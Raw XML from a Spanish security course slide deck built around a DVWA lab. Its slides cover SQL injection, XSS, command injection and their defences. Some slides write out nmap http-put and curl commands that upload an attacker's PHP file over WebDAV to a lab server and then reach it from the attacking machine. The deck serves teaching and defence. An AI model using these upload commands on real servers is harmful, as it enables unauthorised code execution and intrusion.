            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Desactivamos el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>burpsuit</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Nos conectamos desde el atacante</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>	http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>10.0.3.12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>/webdav/hola.php</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D7A59D5A-56C9-3665-D227-0308A2AEF255}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3208462" y="1402336"/>
            <a:ext cx="6811326" cy="1152686"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Imagen 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EF36BDCE-B2B6-C357-40CD-B6F4C47771E0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1484261" y="4131438"/>
            <a:ext cx="9412013" cy="1838582"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5478141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519697" y="105343"/>
            <a:ext cx="8784976" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ataque con </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>metasploid</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2ED1C577-E436-0136-B8F7-B53004D24061}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="519697" y="887980"/>
            <a:ext cx="6094428" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Al realizar un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>ls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> vemos la información del servidor</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CB37EC94-C7E4-24F1-889B-FC7AEADED621}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2229206" y="1808343"/>
            <a:ext cx="7563906" cy="2562583"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37081796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767408" y="332656"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Otras formas de subir el fichero PHP</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="767408" y="1142329"/>
            <a:ext cx="10801200" cy="4248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a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>Cadaver</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>Nmap</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> -p 80 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>192.168.1.103</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> --script http-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>put</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> --script-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> http-put.url='/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>dav</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>/nmap.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>',http-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>put.file</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>='/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>root</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>/Desktop/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>nmap.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>curl</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>curl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>192.168.1.103</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>/dav/ --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>upload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>-file /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>root</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>/Desktop/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>curl.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> -v</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Imagen 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8C0217AC-6895-1514-EA95-4AA2E590103D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3647728" y="1142329"/>
            <a:ext cx="6068272" cy="1009791"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30711001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435092" y="229220"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Práctica</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1654793" y="1404378"/>
            <a:ext cx="9343950" cy="4248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a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Realizar el ataque de inyección de HTML</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8934765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ítulo 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1671070" y="2492067"/>
            <a:ext cx="8208838" cy="936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s-ES" altLang="es-ES" sz="5000" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Inyección por comando</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39861747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8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección comando ataque</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B620229-2E81-473B-9A81-3D2E62D70F36}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="983432" y="1556792"/>
            <a:ext cx="5241322" cy="3955950"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Imagen 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ABBDC9CB-720D-4369-88EB-314EA95384B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6199269" y="1538432"/>
            <a:ext cx="5617472" cy="3834784"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26464095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9416" y="404664"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección comando defensa</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Imagen 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9D57392C-DDE2-4E90-93B5-F694E0CF4127}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="839417" y="2027242"/>
            <a:ext cx="10801200" cy="2862649"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="213361394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435092" y="229220"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Práctica</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1654793" y="1404378"/>
            <a:ext cx="9343950" cy="424862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57200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Realizar el ataque de inyección de comandos</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1650498826"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="M20_P_FP_CAT">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ct val="150000"/>
          </a:lnSpc>
          <a:defRPr dirty="0" smtClean="0">
            <a:solidFill>
              <a:srgbClr val="838383"/>
            </a:solidFill>
          </a:defRPr>
        </a:defPPr>
      </a:lstStyle>
    </a:txDef>
  </a:objectDefaults>
  <a:extraClrSchemeLst/>
  <a:extLst>
    <a:ext uri="{05A4C25C-085E-4340-85A3-A5531E510DB2}">
      <thm15:themeFamily xmlns:thm15="http://schemas.microsoft.com/office/thememl/2012/main" name="M20_P_FP_CAT" id="{E1A703D2-DCA9-47FD-8365-EEA526BFC89C}" vid="{592018BE-9F3F-46EC-8656-92BFEC8FE2B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M20_P_FP_CAT</Template>
  <TotalTime>19508</TotalTime>
  <Words>4449</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Panorámica</PresentationFormat>
  <Paragraphs>653</Paragraphs>
  <Slides>95</Slides>
  <Notes>94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95</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="103" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Arial Black</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>Roboto-Regular</vt:lpstr>
      <vt:lpstr>SFMono-Regular</vt:lpstr>
      <vt:lpstr>Symbol</vt:lpstr>
      <vt:lpstr>M20_P_FP_CAT</vt:lpstr>
      <vt:lpstr>CETI – M09 – Secure API</vt:lpstr>
      <vt:lpstr>Presentación de PowerPoint</vt:lpstr>
      <vt:lpstr>Laboratorios</vt:lpstr>
      <vt:lpstr>Creando DVWA lab</vt:lpstr>
      <vt:lpstr>DVWA – En máquina virtual</vt:lpstr>
      <vt:lpstr>DVWA – En máquina virtual</vt:lpstr>
      <vt:lpstr>DVWA – En máquina virtual</vt:lpstr>
      <vt:lpstr>DVWA – En máquina virtual – actualizar BurpSuite</vt:lpstr>
      <vt:lpstr>DVWA – En máquina virtual – actualizar BurpSuite</vt:lpstr>
      <vt:lpstr>DVWA – En máquina virtual – actualizar BurpSuite</vt:lpstr>
      <vt:lpstr>DVWA – En kali</vt:lpstr>
      <vt:lpstr>Práctica</vt:lpstr>
      <vt:lpstr>Presentación de PowerPoint</vt:lpstr>
      <vt:lpstr>Parametrización</vt:lpstr>
      <vt:lpstr>Parametrización</vt:lpstr>
      <vt:lpstr>Presentación de PowerPoint</vt:lpstr>
      <vt:lpstr>Inyección SQL: ataque</vt:lpstr>
      <vt:lpstr>Inyección SQL: prevención</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL ataque - básica</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL ataque – consultar número columnas</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL ataque – inyección union</vt:lpstr>
      <vt:lpstr>Práctica</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL ataque – Nivel medio con Burp Suite</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL ataque – Nivel medio con Burp Suite</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL ataque – Nivel medio con Burp Suite</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL ataque – Nivel medio con inspeccionar</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL ataque – Nivel medio con inspeccionar</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL ataque – Nivel elevado</vt:lpstr>
      <vt:lpstr>Práctica</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL ataque – Nivel elevado</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL ataque – sqlmap</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL ataque – sqlmap</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL ataque – sqlmap</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL ataque – sqlmap</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL ataque – sqlmap</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL ataque – sqlmap</vt:lpstr>
      <vt:lpstr>Práctica</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL ataque – scan automático</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL defensa</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL defensa</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL defensa</vt:lpstr>
      <vt:lpstr>DVWA: inyección SQL defensa</vt:lpstr>
      <vt:lpstr>Presentación de PowerPoint</vt:lpstr>
      <vt:lpstr>Inyección XSS</vt:lpstr>
      <vt:lpstr>Inyección XSS</vt:lpstr>
      <vt:lpstr>Inyección XSS</vt:lpstr>
      <vt:lpstr>Prevención XSS – Controles de entrada</vt:lpstr>
      <vt:lpstr>Prevención XSS – Controles de entrada</vt:lpstr>
      <vt:lpstr>Prevención XSS – Controles de entrada</vt:lpstr>
      <vt:lpstr>Prevención XSS – Codificar datos de salida</vt:lpstr>
      <vt:lpstr>Prevención XSS – Codificar datos de salida</vt:lpstr>
      <vt:lpstr>Prevención XSS – Codificar datos de salida</vt:lpstr>
      <vt:lpstr>Prevención XSS – Encabezados adecuados</vt:lpstr>
      <vt:lpstr>Prevención XSS – Seguridad en navegadores</vt:lpstr>
      <vt:lpstr>Prevención XSS – Frameworks</vt:lpstr>
      <vt:lpstr>Presentación de PowerPoint</vt:lpstr>
      <vt:lpstr>XSS-DOM-Definicion</vt:lpstr>
      <vt:lpstr>XSS-DOM- Cheat sheet / chuleta</vt:lpstr>
      <vt:lpstr>DVWA: inyección XSS DOM Low security</vt:lpstr>
      <vt:lpstr>DVWA: inyección XSS DOM Robando la cookie-Low</vt:lpstr>
      <vt:lpstr>DVWA: inyección XSS DOM Robando la cookie-Medium</vt:lpstr>
      <vt:lpstr>DVWA: inyección XSS DOM high</vt:lpstr>
      <vt:lpstr>DVWA: inyección XSS DOM impossible</vt:lpstr>
      <vt:lpstr>DVWA: inyección XSS Almacenado – ataques - low</vt:lpstr>
      <vt:lpstr>DVWA: inyección XSS Almacenado – ataques - medium</vt:lpstr>
      <vt:lpstr>DVWA: inyección XSS Almacenado – ataques - medium</vt:lpstr>
      <vt:lpstr>DVWA: inyección XSS Almacenado – ataques - medium</vt:lpstr>
      <vt:lpstr>DVWA: inyección XSS Almacenado – ataques - High</vt:lpstr>
      <vt:lpstr>DVWA: inyección XSS Almacenado – ataques - Impossible</vt:lpstr>
      <vt:lpstr>DVWA: inyección XSS Almacenado - defensas</vt:lpstr>
      <vt:lpstr>DVWA: inyección XSS Reflejado</vt:lpstr>
      <vt:lpstr>Práctica</vt:lpstr>
      <vt:lpstr>Presentación de PowerPoint</vt:lpstr>
